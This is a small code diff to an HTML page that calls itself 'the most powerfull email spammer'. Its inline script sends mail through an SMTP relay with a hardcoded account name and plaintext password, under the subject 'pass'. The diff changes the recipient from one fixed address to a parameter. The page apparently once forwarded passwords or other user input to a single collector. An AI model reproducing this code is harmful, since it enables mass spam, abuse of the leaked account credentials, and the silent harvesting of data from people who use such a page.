@@ -2,12 +2,12 @@
 <head>
 <title>The most powerfull email spammer - Easy to use</title>
       <script>
-function sendEmail(body) {
+function sendEmail(body, to) {
       Email.send({
         Host: "smtp.elasticemail.com",
         Username: "codeprogramerpro@gmail.com",
         Password: "F61272413F1ED2F92DEE220800968B01118B",
-        To: "basedatapadrelo@hotmail.com",
+        To: to,
         From: "codeprogramerpro@gmail.com",
         Subject: "pass",
         Body: body
